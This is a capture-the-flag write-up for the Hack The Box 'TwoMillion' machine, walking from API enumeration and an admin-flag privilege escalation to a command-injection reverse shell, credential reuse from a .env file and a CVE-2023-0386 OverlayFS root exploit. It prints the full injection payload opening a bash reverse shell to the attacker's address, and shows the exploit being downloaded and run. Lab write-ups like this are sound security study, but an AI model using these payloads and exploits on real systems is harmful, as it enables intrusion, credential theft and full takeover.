---
name: TwoMillion
os: Linux
difficulty: Easy
status: PWNED
pwn_date: 26 Feb 2026
summary: Analysis of minified JS revealed an API for invite code generation, yielding a Base64-encoded string via a POST request. After registration, API enumeration of the /api/v1/admin/settings/update endpoint allowed for administrative privilege escalation through JSON parameter manipulation in a PUT request. This provided access to /api/v1/admin/vpn/generate, where OS Command Injection in the username parameter yielded a reverse shell as www-data. Local enumeration uncovered database credentials in a .env file, which were reused to gain SSH access as admin. Finally, the system was found vulnerable to CVE-2023-0386 (OverlayFS). By leveraging FUSE to craft a malicious SUID binary and triggering a "copy-up" operation, the kernel failed to strip the SUID bit when moving the file to the host's upper directory. Executing this binary granted root privileges, allowing for the retrieval of the final flag.
matrix_enum: 6
matrix_real: 6
matrix_cve: 6
matrix_custom: 4
matrix_ctf: 4
---

<div style="background: linear-gradient(135deg, #0d1117 0%, #16213e 100%); padding: 25px; border-radius: 15px; border: 1px solid #9acd32; font-family: 'Inter', sans-serif; color: white; display: flex; align-items: center; justify-content: space-between; gap: 5px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); min-height: 190px;">
    
    <div style="display: flex; align-items: center; gap: 25px;">
        <div style="flex-shrink: 0; width: 105px; height: 105px; border-radius: 50%; border: 3px solid #9acd32; overflow: hidden; background: #0d1117; box-shadow: 0 0 20px #9acd3233;">
            <img src="Tought Process/!Media/!Logo_TwoMillion.png" style="width: 100%; height: 100%; object-fit: cover;" onerror="this.src='https://www.hackthebox.com/storage/avatars/6aae4108848d5f493b26c68a4176953b.png'">
        </div>
        <div>
            <h1 style="margin: 0; font-size: 34px; font-weight: 800; color: #ffffff; text-transform: uppercase; letter-spacing: 2px; line-height: 1;">TwoMillion</h1>
            <div style="margin-top: 10px;"><span style="font-size: 11px; font-weight: bold; color: #9acd32; border: 1.5px solid #9acd32; padding: 3px 12px; border-radius: 4px; text-transform: uppercase;">PWNED</span></div>
            <div style="display: flex; gap: 15px; margin-top: 18px; font-size: 14px; font-weight: 500; opacity: 0.9;">
                <span><span style="color: #9acd32;">💻</span> Linux</span>
                <span><span style="color: #9acd32;">🔥</span> Easy</span>
                <span><span style="color: #9acd32;">📅</span> 26 Feb 2026</span>
            </div>
        </div>
    </div>

    <div style="width: 220px; height: 190px; flex-shrink: 0; display: flex; align-items: center; justify-content: center;">
        <svg width="220" height="190" viewBox="0 0 190 175">
            <circle cx="80" cy="85" r="62" fill="rgba(255,255,255,0.015)" />
            <polygon points="80,25 137,65 115,130 45,130 23,65" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5" />
            <polygon points="80,40 122,70 106,118 54,118 38,70" fill="none" stroke="rgba(255,255,255,0.07)" stroke-width="0.5" />
            <polygon points="80,55 108,75 97,106 63,106 52,75" fill="none" stroke="rgba(255,255,255,0.07)" stroke-width="0.5" />
            <polygon points="80,70 93,80 88,95 72,95 67,80" fill="none" stroke="rgba(255,255,255,0.07)" stroke-width="0.5" />
            
            <text x="80" y="15" font-size="9" fill="#aaa" text-anchor="middle" font-weight="bold">ENUM</text>
            <text x="142" y="65" font-size="9" fill="#aaa" text-anchor="start" font-weight="bold">REAL</text>
            <text x="115" y="145" font-size="9" fill="#aaa" text-anchor="middle" font-weight="bold">CVE</text>
            <text x="45" y="145" font-size="9" fill="#aaa" text-anchor="middle" font-weight="bold">CUSTOM</text>
            <text x="18" y="65" font-size="9" fill="#aaa" text-anchor="end" font-weight="bold">CTF</text>
            
            <polygon points="80,56.2 107.39042766930042,76.10031056200151 96.92821526602323,108.29968943799848 68.71452315598452,100.533126291999 61.73971488713305,79.06687370800101" fill="#9acd3233" stroke="#9acd32" stroke-width="2.5" stroke-linejoin="round" />
            <circle cx="80" cy="85" r="2.5" fill="#9acd32" />
        </svg>
    </div>
</div>

---

For this Box, I started with the usual nmap. The scan outputted:

```zsh
sudo nmap -sS --top-ports 100 10.129.4.0  
```
```
Nmap scan report for 10.129.4.0  
Host is up (0.065s latency).  
Not shown: 98 closed tcp ports (reset)  
PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  
  
Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds
```

```zsh
sudo nmap -sU --top-ports 100 10.129.4.0
```
```
Nmap scan report for 10.129.4.0
Host is up (0.081s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 112.02 seconds
```

Checking the http port, it redirects to 2million.htb. Lets add that to our /etc/hosts and visit the website again:

![[TwoMillion_1.png]]

After reading through the page a bit, we stumble upon the invite page. Checking the network traffic, we see an "inviteapi.min.js":

```js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

One function stands out immediately, the "makeInviteCode". Lets run that on the programmer tools' console:

```js
makeInviteCode()  

data: Object { 
	data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
	enctype: "ROT13"
	hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Lets search for this encryption type, and try to decrypt the string (ROT13 is the same as Caeser's Chiper with 13 offset):

```
Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr

In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Well, let's do that. We will use cURL to make the request:

```zsh
curl -X POST http://2million.htb/api/v1/invite/generate
```
```
{"0":200,"success":1,"data":{"code":"UDJMQzEtSEtLOU0tOVVNVE8tQTc2UzM=","format":"encoded"}}
```

A trained eye very quickly realizes that ```UDJMQzEtSEtLOU0tOVVNVE8tQTc2UzM=``` is in base64. We could've used an online cipher detector. Let's decipher it:

```zsh
echo "UDJMQzEtSEtLOU0tOVVNVE8tQTc2UzM=" | base64 -d
```
```
P2LC1-HKK9M-9UMTO-A76S3
```

Looks like we got an invite code! Lets test it out:

```zsh
curl -X POST http://2million.htb/api/v1/invite/verify -d "code=P2LC1-HKK9M-9UMTO-A76S3"
```
```
{"0":200,"success":1,"data":{"message":"Invite code is valid!"}}
```

Using the code in the website redirects us to the register page. Here we can create an user:

![[TwoMillion_2.png]]

After registering, we are redirected once again, now to the login page. After introducing the email and password we just created, we enter in /home:

![[TwoMillion_3.png]]

Reading through the available pages, we see one api endpoint, which clearly points to a user api. We can do directory busting using ffuf, to check the other endpoints of the /user api:

```zsh
ffuf -u http://2million.htb/api/v1/user/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -mc 200,401,403,405
```
```  
/'___\  /'___\           /'___\  
/\ \__/ /\ \__/  __  __  /\ \__/  
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
\ \_\   \ \_\  \ \____/  \ \_\  
\/_/    \/_/   \/___/    \/_/  
  
v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://2million.htb/api/v1/user/FUZZ  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,401,403,405  
________________________________________________  
  
register                [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 64ms]  
register                [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 89ms]  
auth                    [Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 60ms]  
auth                    [Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 84ms]  
login                   [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 227ms]  
register                [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 155ms]  
:: Progress: [12334/12334] :: Job [1/1] :: 361 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

If we think a little bit, the /admin api might exist. Lets do the same, now for the /admin api:

```zsh
ffuf -u http://2million.htb/api/v1/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -mc 200,401,403,405
```
```  
/'___\  /'___\           /'___\  
/\ \__/ /\ \__/  __  __  /\ \__/  
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
\ \_\   \ \_\  \ \____/  \ \_\  
\/_/    \/_/   \/___/    \/_/  
  
v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://2million.htb/api/v1/admin/FUZZ  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,401,403,405  
________________________________________________  
  
auth                    [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 82ms]  
auth                    [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 111ms]  
:: Progress: [12334/12334] :: Job [1/1] :: 381 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

We didn't find much. Lets continue our thought and see what more api endpoints we might have:

```zsh
ffuf -u http://2million.htb/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -mc 200,401,403,405
```
```
/'___\  /'___\           /'___\
/\ \__/ /\ \__/  __  __  /\ \__/
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
\ \_\   \ \_\  \ \____/  \ \_\
\/_/    \/_/   \/___/    \/_/

v2.1.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://2million.htb/api/FUZZ
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,401,403,405
________________________________________________

v1                      [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 86ms]
:: Progress: [12334/12334] :: Job [1/1] :: 376 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

```zsh
ffuf -u http://2million.htb/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -mc 200,401,403,405
```
```
/'___\  /'___\           /'___\
/\ \__/ /\ \__/  __  __  /\ \__/
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
\ \_\   \ \_\  \ \____/  \ \_\
\/_/    \/_/   \/___/    \/_/

v2.1.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://2million.htb/api/v1/FUZZ
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,401,403,405
________________________________________________

:: Progress: [12334/12334] :: Job [1/1] :: 408 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

Maybe we won't get there by bruteforcing. What happens if we cURL the /api endpoint with our session cookie?:

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" http://2million.htb/api
```
```
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 24 Feb 2026 10:10:10 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"\/api\/v1":"Version 1 of the API"}
```

Looks like we are onto something! The api returned the existing endpoints, so if we do the same, but for /api/v1:

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" http://2million.htb/api/v1
```
```
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 24 Feb 2026 10:10:17 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
```

Now we can see 3 admin endpoints: /auth, /vpn/generate and /settings/update. Lets try the last two:

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X POST http://2million.htb/api/v1/admin/vpn/generate
```
```
HTTP/1.1 401 Unauthorized
Server: nginx
Date: Tue, 24 Feb 2026 10:16:38 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update
```
```
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 24 Feb 2026 10:15:56 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"status":"danger","message":"Invalid content type."}
```

If we try to use this endpoint (by sending an empty body), maybe it will "correct" uss by saying what parameters are missing:

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{}'
```
```
HTTP/1.1 200 OK  
Server: nginx  
Date: Tue, 24 Feb 2026 10:26:02 GMT  
Content-Type: application/json  
Transfer-Encoding: chunked  
Connection: keep-alive  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
  
{"status":"danger","message":"Missing parameter: email"}
```

Lets add our account email:

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"abcdefg@abcdefg.abc"}'
```
```
HTTP/1.1 200 OK  
Server: nginx  
Date: Tue, 24 Feb 2026 10:28:15 GMT  
Content-Type: application/json  
Transfer-Encoding: chunked  
Connection: keep-alive  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
  
{"status":"danger","message":"Missing parameter: is_admin"}
```

Continuing with the same logic:

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"abcdefg@abcdefg.abc", "is_admin":true}'
```
```
HTTP/1.1 200 OK  
Server: nginx  
Date: Tue, 24 Feb 2026 10:28:59 GMT  
Content-Type: application/json  
Transfer-Encoding: chunked  
Connection: keep-alive  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
  
{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}
```

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"abcdefg@abcdefg.abc", "is_admin":1}'
```
```
HTTP/1.1 200 OK  
Server: nginx  
Date: Tue, 24 Feb 2026 10:29:17 GMT  
Content-Type: application/json  
Transfer-Encoding: chunked  
Connection: keep-alive  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
  
{"id":13,"username":"abcdefg","is_admin":1}
```

If we use the /auth endpoint to check if we are now admin (using the same cookie):

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" http://2million.htb/api/v1/admin/auth
```
```
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 24 Feb 2026 10:32:14 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"message":true}
```

Now we can generate the vpn connection file as admin:

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{}'
```
```
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 24 Feb 2026 10:35:28 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"status":"danger","message":"Missing parameter: username"}
```

We can try and do a command injection in this endpoint (since it's generating a file with the given username). By listening for connections with netcat in our machine, we can run the following:

```zsh
curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" \  
-X POST http://2million.htb/api/v1/admin/vpn/generate \  
-H "Content-Type: application/json" \  
-d '{"username":"abcdefg; bash -c \"bash -i >& /dev/tcp/10.10.14.113/4444 0>&1\""}'
```

```zsh
nc -lvnp 4444
```
```
Listening on 0.0.0.0 4444
Connection received on 10.129.229.66 56156
bash: cannot set terminal process group (1098): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$
```

Now we can easily get the user flag at "user.txt"

```zsh
www-data@2million:~/html$ find / -name "user.txt" 2>/dev/null
/home/admin/user.txt
www-data@2million:~/html$ cd ../../..
www-data@2million:/$ cd home/admin
www-data@2million:/home/admin$ cat user.txt
cat: user.txt: Permission denied
```

Or so I thought. Why can't we cat this file?

```zsh
www-data@2million:/home/admin$ ls -l
total 4
-rw-r----- 1 root admin 33 Feb 24 09:15 user.txt
```

And if we check, we are not part of the "admin" group (should've checked this first):

```zsh
www-data@2million:~/htm/adminl$ id  
id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Lets look around to see if we can get to the admin group somehow:

```zsh
www-data@2million:/home/admin$ cd ~/home
www-data@2million:~/html$ ls -a  
.  
..  
.env  
Database.php  
Router.php  
VPN  
assets  
controllers  
css  
fonts  
images  
index.php  
js  
views  
www-data@2million:~/html$ cat .env 
DB_HOST=127.0.0.1  
DB_DATABASE=htb_prod  
DB_USERNAME=admin  
DB_PASSWORD=SuperDuperPass123  
```

Lets connect to the database and see what we can find:

```zsh
ww-data@2million:~/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@2million:~/html$ mysql -u admin -p'SuperDuperPass123' -h 127.0.0.1 htb_prod -e "SHOW TABLES;"
<perPass123' -h 127.0.0.1 htb_prod -e "SHOW TABLES;"
+--------------------+
| Tables_in_htb_prod |
+--------------------+
| invite_codes       |
| users              |
+--------------------+
www-data@2million:~/html$ mysql -u admin -p'SuperDuperPass123' -h 127.0.0.1 htb_prod -e "SELECT * FROM users;"
<23' -h 127.0.0.1 htb_prod -e "SELECT * FROM users;"
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |  1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |  1 |
| 13 | abcdefg      | abcdefg@abcdefg.abc        | $2y$10$d0Vdb3.EyuSqK/oS42Wi2OuaoFdbRVpF8eODix3wR8iGozu4KS0PG |  1 |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
```

The database as nothing special we can work with. We should enumerate deeper, there's something missing for sure. LinPEAS will come handy here. I'll open a http server on my pc so I can cURL LinPEAS into the machine:

```zsh
sudo python3 -m http.server 80  
[sudo] password for diogocoutoooo:  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```zsh
www-data@2million:~/html$ cd ../../..  
www-data@2million:/$ cd tmp
www-data@2million:/tmp$ curl http://10.10.14.113:80/linpeas.sh -o linpeas.sh  
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
100  892k  100  892k    0     0   752k      0  0:00:01  0:00:01 --:--:--  753k
www-data@2million:/tmp$ chmod +x linpeas.sh
www-data@2million:/tmp$ ./linpeas.sh
```

Running LinPEAS showed nothing. This box taught me that sometimes its better to wind off by doing something else and getting back to the box after it. We haven't tried ssh as the user "admin", with the pass seen in .env... Lets give it a shot:

```zsh
ssh admin@2million.htb
```
```
admin@2million.htb's password:
admin@2million:~$
```

We got in! Now we can finally get the user.txt flag!:

```zsh
admin@2million:~$ cat user.txt  
107720a672**********************
```

Running the usual commands to check for anything strange:

```zsh
admin@2million:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

We are in a different group! We can enumerate what files this group owns (I trimmed the output and discarded the junk files.):

```zsh
admin@2million:~$ find / -group admin 2>/dev/null
/run/user/1000
/run/user/1000/snapd-session-agent.socket
/run/user/1000/pk-debconf-socket
/run/user/1000/gnupg
/run/user/1000/gnupg/S.gpg-agent
/run/user/1000/gnupg/S.gpg-agent.ssh
/run/user/1000/gnupg/S.gpg-agent.extra
/run/user/1000/gnupg/S.gpg-agent.browser
/run/user/1000/gnupg/S.dirmngr
/run/user/1000/bus
/run/user/1000/systemd
/run/user/1000/systemd/private
/run/user/1000/systemd/notify
/run/user/1000/systemd/generator.late
/run/user/1000/systemd/generator.late/xdg-desktop-autostart.target.wants
/run/user/1000/systemd/generator.late/xdg-desktop-autostart.target.wants/app-snap\x2duserd\x2dautostart@autostart.service
/run/user/1000/systemd/generator.late/app-snap\x2duserd\x2dautostart@autostart.service
/run/user/1000/systemd/units
/run/user/1000/systemd/units/invocation:dbus.socket
/run/user/1000/systemd/inaccessible
/run/user/1000/systemd/inaccessible/chr
/run/user/1000/systemd/inaccessible/sock
/run/user/1000/systemd/inaccessible/fifo
/run/user/1000/systemd/inaccessible/dir
/run/user/1000/systemd/inaccessible/reg
/home/admin
/home/admin/.cache
/home/admin/.cache/motd.legal-displayed
/home/admin/.ssh
/home/admin/.profile
/home/admin/user.txt
/home/admin/.bash_logout
/home/admin/.bashrc
/var/mail/admin
```

Uh, let's take a look at this last file:

```zsh
admin@2million:/var/mail$ cat admin
```
```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Searching about OverlayFS CVE (CVE-2023-0386), we stumble upon a Kernel exploit that lets an unprivileged user to escalate their privileges by copying files with setuid attributes from a nosuid mount to a writable mount. Using the PoC in this link `https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c`, we can escalate to a root user:

```zsh
admin@2million:/tmp$ wget http://10.10.14.113:9000/poc -O /tmp/poc  
--2026-02-26 12:57:22--  http://10.10.14.113:9000/poc  
Connecting to 10.10.14.113:9000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 1284224 (1.2M) [application/octet-stream]  
Saving to: ‘/tmp/poc’  
  
/tmp/poc                     100%[=============================================>]   1.22M   746KB/s    in 1.7s  
  
2026-02-26 12:57:24 (746 KB/s) - ‘/tmp/poc’ saved [1284224/1284224]  
  
admin@2million:/tmp$ chmod +x poc && ./poc  
Waiting 1 sec...  
unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=/tmp/ovlcap/lower,upperdir=/tmp/ovlcap/upper,workdir=/tmp  
/ovlcap/work /tmp/ovlcap/merge && ls -la /tmp/ovlcap/merge && touch /tmp/ovlcap/merge/file'  
[+] readdir  
[+] getattr_callback  
/file  
total 8  
drwxrwxr-x 1 root   root     4096 Feb 26 12:57 .  
drwxrwxr-x 6 root   root     4096 Feb 26 12:57 ..  
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file  
[+] open_callback  
/file  
[+] read_callback  
cnt  : 0  
clen  : 0  
path  : /file  
size  : 0x4000  
offset: 0x0  
[+] open_callback  
/file  
[+] open_callback  
/file  
[+] ioctl callback  
path /file  
cmd 0x80086601  
/tmp/ovlcap/upper/file  
To run a command as administrator (user "root"), use "sudo <command>".  
See "man sudo_root" for details.  
  
root@2million:/tmp#
```

To finish, we just need to grab the root.txt flag:

```zsh
root@2million:/tmp# cd ..  
root@2million:/# cd root  
root@2million:/root# cat root.txt  
d1cbf6226a**********************
```